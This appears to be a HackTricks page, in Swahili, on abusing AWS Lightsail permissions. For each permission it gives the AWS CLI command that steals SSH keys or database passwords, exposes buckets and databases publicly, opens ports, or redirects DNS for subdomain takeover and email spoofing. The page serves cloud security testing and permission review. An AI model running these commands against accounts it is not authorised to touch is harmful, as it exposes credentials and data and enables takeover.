# AWS - Lightsail Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Lightsail

Kwa maelezo zaidi kuhusu Lightsail angalia:

{{#ref}}
../aws-services/aws-lightsail-enum.md
{{#endref}}

> [!WARNING]
> Ni muhimu kutambua kwamba Lightsail **haitumii majukumu ya IAM yanayomilikiwa na mtumiaji** bali kwa akaunti inayosimamiwa na AWS, hivyo huwezi kutumia huduma hii kwa privesc. Hata hivyo, **data nyeti** kama vile msimbo, funguo za API na taarifa za database zinaweza kupatikana katika huduma hii.

### `lightsail:DownloadDefaultKeyPair`

Ruhusa hii itakuruhusu kupata funguo za SSH za kufikia mifano:
```
aws lightsail download-default-key-pair
```
**Athari Inayoweza Kutokea:** Pata taarifa nyeti ndani ya mifano.

### `lightsail:GetInstanceAccessDetails`

Ruhusa hii itakuruhusu kuunda funguo za SSH ili kufikia mifano:
```bash
aws lightsail get-instance-access-details --instance-name <instance_name>
```
**Madhara Yanayoweza Kutokea:** Pata taarifa nyeti ndani ya mifano.

### `lightsail:CreateBucketAccessKey`

Ruhusa hii itakuruhusu kupata ufunguo wa kufikia chombo:
```bash
aws lightsail create-bucket-access-key --bucket-name <name>
```
**Madhara Yanayoweza Kutokea:** Pata taarifa nyeti ndani ya bucket.

### `lightsail:GetRelationalDatabaseMasterUserPassword`

Ruhusa hii itakuruhusu kupata akreditivu za kufikia database:
```bash
aws lightsail get-relational-database-master-user-password --relational-database-name <name>
```
**Madhara Yanayoweza Kutokea:** Pata taarifa nyeti ndani ya database.

### `lightsail:UpdateRelationalDatabase`

Ruhusa hii itakuruhusu kubadilisha nenosiri la kufikia database:
```bash
aws lightsail update-relational-database --relational-database-name <name> --master-user-password <strong_new_password>
```
Ikiwa hifadhidata si ya umma, unaweza pia kuifanya kuwa ya umma kwa ruhusa hizi na
```bash
aws lightsail update-relational-database --relational-database-name <name> --publicly-accessible
```
**Madhara Yanayoweza Kutokea:** Pata taarifa nyeti ndani ya database.

### `lightsail:OpenInstancePublicPorts`

Ruhusa hii inaruhusu kufungua bandari kwa Mtandao.
```bash
aws lightsail open-instance-public-ports \
--instance-name MEAN-2 \
--port-info fromPort=22,protocol=TCP,toPort=22
```
**Madhara Yanayoweza Kutokea:** Upatikanaji wa bandari nyeti.

### `lightsail:PutInstancePublicPorts`

Ruhusa hii inaruhusu kufungua bandari kwa Mtandao. Kumbuka kwamba wito utafungia bandari yoyote iliyofunguliwa ambayo haijatajwa ndani yake.
```bash
aws lightsail put-instance-public-ports \
--instance-name MEAN-2 \
--port-infos fromPort=22,protocol=TCP,toPort=22
```
**Madhara Yanayoweza Kutokea:** Upatikanaji wa bandari nyeti.

### `lightsail:SetResourceAccessForBucket`

Ruhusa hii inaruhusu kutoa upatikanaji wa mfano kwa ndoo bila hati zozote za ziada.
```bash
aws set-resource-access-for-bucket \
--resource-name <instance-name> \
--bucket-name <bucket-name> \
--access allow
```
**Madhara Yanayoweza Kutokea:** Upatikanaji mpya wa uwezo wa mifuko yenye taarifa nyeti.

### `lightsail:UpdateBucket`

Kwa ruhusa hii, mshambuliaji anaweza kutoa upatikanaji wa kusoma kwa akaunti yake ya AWS juu ya mifuko au hata kufanya mifuko hiyo kuwa ya umma kwa kila mtu:
```bash
# Grant read access to exterenal account
aws update-bucket --bucket-name <value> --readonly-access-accounts <external_account>

# Grant read to the public
aws update-bucket --bucket-name <value> --access-rules getObject=public,allowPublicOverrides=true

# Bucket private but single objects can be public
aws update-bucket --bucket-name <value> --access-rules getObject=private,allowPublicOverrides=true
```
**Madhara Yanayoweza Kutokea:** Upatikanaji mpya wa uwezekano wa mifuko yenye taarifa nyeti.

### `lightsail:UpdateContainerService`

Kwa ruhusa hii, mshambuliaji anaweza kutoa upatikanaji kwa ECRs za kibinafsi kutoka kwa huduma za kontena.
```bash
aws update-container-service \
--service-name <name> \
--private-registry-access ecrImagePullerRole={isActive=boolean}
```
**Madhara Yanayoweza Kutokea:** Pata taarifa nyeti kutoka ECR ya faragha

### `lightsail:CreateDomainEntry`

Mshambuliaji mwenye ruhusa hii anaweza kuunda subdomain na kuielekeza kwenye anwani yake ya IP (uchukuaji wa subdomain), au kuunda rekodi ya SPF inayomruhusu kudanganya barua pepe kutoka kwenye domain, au hata kuweka domain kuu kwenye anwani yake ya IP.
```bash
aws lightsail create-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Madhara Yanayoweza Kutokea:** Kuchukua udhibiti wa kikoa

### `lightsail:UpdateDomainEntry`

Mshambuliaji mwenye ruhusa hii anaweza kuunda subdomain na kuielekeza kwenye anwani yake ya IP (kuchukua subdomain), au kuunda rekodi ya SPF inayomruhusu kudanganya barua pepe kutoka kwa kikoa, au hata kuweka kikoa kikuu kwenye anwani yake ya IP.
```bash
aws lightsail update-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Madhara Yanayoweza Kutokea:** Kuchukua udhibiti wa kikoa

{{#include ../../../banners/hacktricks-training.md}}
